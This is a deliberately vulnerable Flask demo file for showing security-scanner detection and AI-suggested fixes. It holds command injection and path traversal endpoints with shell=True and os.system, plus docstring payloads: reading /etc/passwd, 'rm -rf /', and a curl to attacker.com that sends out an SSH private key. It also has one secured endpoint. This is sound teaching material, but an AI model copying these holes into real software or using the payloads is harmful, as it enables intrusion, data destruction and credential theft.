"""
⚠️  VULNERABLE CODE - FOR LIVE DEMO ONLY ⚠️

This file demonstrates command injection vulnerabilities.
USE THIS DURING THE LIVE DEMO to show:
1. Snyk MCP Server detecting issues in real-time
2. Gemini Code Assist suggesting secure alternatives
3. How to fix the vulnerabilities

DO NOT USE IN PRODUCTION!
"""

from flask import Flask, request, jsonify
import subprocess
import os

app = Flask(__name__)

# ========================================
# VULNERABILITY 1: Command Injection via shell=True
# ========================================
@app.route('/ping', methods=['POST'])
def ping_vulnerable():
    """
    🔴 VULNERABILITY: Command Injection
    
    Snyk MCP will flag: "Command injection via shell execution"
    
    Attack Example:
      POST /ping
      {"host": "google.com; cat /etc/passwd"}
    
    Why it's vulnerable:
      - Uses shell=True which allows command chaining
      - No input validation
      - User input directly in command string
    """
    data = request.get_json()
    host = data.get('host', 'localhost')
    
    # 🔴 VULNERABLE: Using shell=True with user input
    command = f'ping -c 1 {host}'
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    
    return jsonify({'output': result.stdout})


# ========================================
# VULNERABILITY 2: Command Injection via os.system
# ========================================
@app.route('/exec', methods=['POST'])
def exec_command():
    """
    🔴 VULNERABILITY: Arbitrary Command Execution
    
    Snyk MCP will flag: "Dangerous use of os.system with user input"
    
    Attack Example:
      POST /exec
      {"cmd": "ls && rm -rf /"}
    
    Why it's vulnerable:
      - os.system executes any command
      - No validation whatsoever
      - Complete system access
    """
    data = request.get_json()
    command = data.get('cmd', 'echo hello')
    
    # 🔴 VULNERABLE: os.system with user input
    os.system(command)
    
    return jsonify({'status': 'executed'})


# ========================================
# VULNERABILITY 3: Path Traversal
# ========================================
@app.route('/read-log', methods=['POST'])
def read_log():
    """
    🔴 VULNERABILITY: Path Traversal
    
    Snyk MCP will flag: "Path traversal vulnerability"
    
    Attack Example:
      POST /read-log
      {"filename": "../../etc/passwd"}
    
    Why it's vulnerable:
      - No path validation
      - Allows directory traversal
      - Can read any file on system
    """
    data = request.get_json()
    filename = data.get('filename', 'app.log')
    
    # 🔴 VULNERABLE: No path validation
    filepath = f'/var/log/{filename}'
    
    try:
        with open(filepath, 'r') as f:
            content = f.read()
        return jsonify({'content': content})
    except Exception as e:
        return jsonify({'error': str(e)}), 400


# ========================================
# VULNERABILITY 4: Command Injection with subprocess.Popen
# ========================================
@app.route('/network-scan', methods=['POST'])
def network_scan():
    """
    🔴 VULNERABILITY: Command Injection via Popen
    
    Attack Example:
      POST /network-scan
      {"target": "192.168.1.1; curl http://attacker.com/steal?data=$(cat ~/.ssh/id_rsa)"}
    """
    data = request.get_json()
    target = data.get('target', '127.0.0.1')
    
    # 🔴 VULNERABLE: Popen with shell=True
    process = subprocess.Popen(
        f'nmap -sn {target}',
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    stdout, stderr = process.communicate()
    
    return jsonify({'output': stdout.decode()})


# ========================================
# HOW TO FIX (Show this during demo with Gemini)
# ========================================
@app.route('/ping-secure', methods=['POST'])
def ping_secure():
    """
    ✅ SECURE VERSION
    
    Gemini will suggest this pattern.
    """
    import re
    data = request.get_json()
    host = data.get('host', 'localhost')
    
    # ✅ SECURE: Validate input
    if not re.match(r'^[a-zA-Z0-9.-]+$', host):
        return jsonify({'error': 'Invalid hostname'}), 400
    
    # ✅ SECURE: Use list instead of shell=True
    result = subprocess.run(
        ['ping', '-c', '1', host],  # List format prevents injection
        capture_output=True,
        text=True,
        timeout=2
    )
    
    return jsonify({
        'host': host,
        'reachable': result.returncode == 0,
        'output': result.stdout
    })


if __name__ == '__main__':
    print("⚠️  WARNING: This is vulnerable code for demo purposes only!")
    print("    DO NOT USE IN PRODUCTION")
    app.run(debug=True, port=5001)